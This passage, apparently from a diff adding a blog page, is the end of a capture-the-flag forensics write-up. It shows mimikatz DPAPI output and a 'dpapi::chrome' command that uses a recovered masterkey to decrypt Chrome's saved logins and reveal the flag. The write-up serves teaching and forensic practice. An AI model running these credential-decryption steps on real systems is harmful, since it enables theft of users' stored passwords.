+    <span class="n">rounds</span>           <span class="err">:</span> <span class="n">00001f40</span> <span class="p">-</span> <span class="n">8000</span>
+    <span class="n">algHash</span>          <span class="err">:</span> <span class="n">0000800e</span> <span class="p">-</span> <span class="n">32782</span> <span class="p">(</span><span class="n">CALG_SHA_512</span><span class="p">)</span>
+    <span class="n">algCrypt</span>         <span class="err">:</span> <span class="n">00006610</span> <span class="p">-</span> <span class="n">26128</span> <span class="p">(</span><span class="n">CALG_AES_256</span><span class="p">)</span>
+    <span class="n">pbKey</span>            <span class="err">:</span> <span class="n">32bafd010af552fd03f566b9e411cc6ef7860c8e33c4feca3cc3c7fe2e87e09bb477111b88a1930650c8c0a10ea1f9314435bca867b3f905127d563009c8f43ed9def056ac533e51f8aa90104d98ad591a156dffe6776c53ffd4df22cd639c83162396244aff646226e14681dddbf749</span>
+
+<span class="no">[credhist]</span>
+  <span class="p">**</span><span class="n">CREDHIST</span> <span class="n">INFO</span><span class="p">**</span>
+    <span class="n">dwVersion</span>        <span class="err">:</span> <span class="n">00000003</span> <span class="p">-</span> <span class="n">3</span>
+    <span class="n">guid</span>             <span class="err">:</span> <span class="p">{</span><span class="n">a2a87803-e77b</span><span class="p">-</span><span class="n">44b9</span><span class="p">-</span><span class="n">8ca2</span><span class="p">-</span><span class="n">01526cb531e4</span><span class="p">}</span>
+
+<span class="no">[masterkey]</span> <span class="n">with</span> <span class="n">password</span><span class="err">:</span> <span class="n">ransom</span> <span class="p">(</span><span class="n">protected</span> <span class="n">user</span><span class="p">)</span>
+  <span class="n">key</span> <span class="err">:</span> <span class="n">138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630</span>
+  <span class="n">sha1</span><span class="err">:</span> <span class="n">a765463192eb14812650e62d6b0150a262d1864e</span>
+</code></pre></div><p>Then we can use the master key to decrypt the password and get the flag !</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">mimikatz</span> <span class="c"># dpapi::chrome /in:&#34;AppData\Local\Google\Chrome\User Data\Default\Login Data&#34; /unprotect /masterkey:138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630</span>
+<span class="p">&gt;</span> <span class="n">Encrypted</span> <span class="n">Key</span> <span class="n">found</span> <span class="k">in</span> <span class="n">local</span> <span class="n">state</span> <span class="n">file</span>
+<span class="p">&gt;</span> <span class="n">Encrypted</span> <span class="n">Key</span> <span class="n">seems</span> <span class="n">to</span> <span class="n">be</span> <span class="n">protected</span> <span class="n">by</span> <span class="n">DPAPI</span>
+ <span class="p">*</span> <span class="n">using</span> <span class="n">CryptUnprotectData</span> <span class="n">API</span>
+ <span class="p">*</span> <span class="n">masterkey</span>     <span class="err">:</span> <span class="n">138f089556f32b87e53c5337c47f5f34746162db7fe9ef47f13a92c74897bf67e890bcf9c6a1d1f4cc5454f13fcecc1f9f910afb8e2441d8d3dbc3997794c630</span>
+<span class="p">&gt;</span> <span class="n">AES</span> <span class="n">Key</span> <span class="n">is</span><span class="err">:</span> <span class="n">46befddb52a607c5e775b7a930b6b6c4f3a35e7c1c30aaa4ce0d2277fbca6c19</span>
+
+<span class="n">URL</span>     <span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">windowsliveupdater</span><span class="p">.</span><span class="n">com</span><span class="p">/</span> <span class="p">(</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">windowsliveupdater</span><span class="p">.</span><span class="n">com</span><span class="p">/</span> <span class="p">)</span>
+<span class="n">Username</span><span class="err">:</span> <span class="n">ransomoperator</span><span class="nv">@draeglocker</span><span class="p">.</span><span class="n">com</span>
+ <span class="p">*</span> <span class="n">using</span> <span class="n">BCrypt</span> <span class="n">with</span> <span class="n">AES</span><span class="p">-</span><span class="n">256-GCM</span>
+<span class="n">Password</span><span class="err">:</span> <span class="n">HTB</span><span class="p">{</span><span class="n">Br0ws3rs_C4nt_s4v3_y0u_n0w</span><span class="p">}</span>
+</code></pre></div><h3 id="related-sources">Related sources<a hidden class="anchor" aria-hidden="true" href="#related-sources">#</a></h3>
+<p><a href="https://www.alertra.com/blog/decrypting-browser-passwords-other-secrets">https://www.alertra.com/blog/decrypting-browser-passwords-other-secrets</a></p>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords</a></p>
+<p><a href="https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf">https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf</a></p>
+<p><a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++">https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://luhko.github.io/write-up/heroctf2022/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Hero CTF 2022</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://luhko.github.io/">Luhko</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
